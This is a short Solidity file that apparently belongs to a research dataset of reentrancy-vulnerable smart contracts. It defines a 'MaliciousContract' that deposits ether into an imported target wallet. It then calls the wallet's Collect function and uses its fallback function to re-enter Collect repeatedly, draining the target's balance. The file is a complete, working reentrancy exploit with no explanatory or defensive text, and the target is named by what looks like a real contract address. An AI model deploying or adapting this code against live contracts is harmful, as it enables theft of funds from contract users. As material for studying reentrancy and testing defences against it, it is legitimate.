pragma solidity ^0.4.25;

import "../dataset/reentrancy/0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol";

contract MaliciousContract{
    W_WALLET w_WALLET;
    

    constructor(address _w_Wallet) public{
        w_WALLET= W_WALLET (_w_Wallet);
    }

    function attack() public payable{
        require(msg.value >= 1 ether, "Must addd at least 1 ether");
        w_WALLET.Collect(msg.value);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must addd at least 1 ether");
        w_WALLET.Put.value(msg.value)(1);        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(w_WALLET).balance >= 1 ether) {
            w_WALLET.Collect(1 ether);
        }
    }




}